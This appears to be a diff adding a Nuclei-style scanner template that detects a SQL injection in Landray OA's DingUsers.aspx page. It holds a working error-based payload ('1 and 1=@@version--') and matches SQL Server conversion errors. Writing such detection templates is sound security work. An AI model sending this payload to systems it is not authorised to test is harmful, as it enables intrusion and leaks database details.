@@ -1,0 +1,24 @@
+id: Landray-DingUsers_aspx-sqli
+
+info:
+  name: 蓝凌OA DingUsers.aspx SQL注入漏洞
+  author: Landray
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /SM/DingUsers.aspx?id=1%20and%201=@@version-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '转换成数据类型 int 时失败'
+          - '在将 nvarchar 值'
+        condition: and
+      - type: status
+        status: 
+          - 500
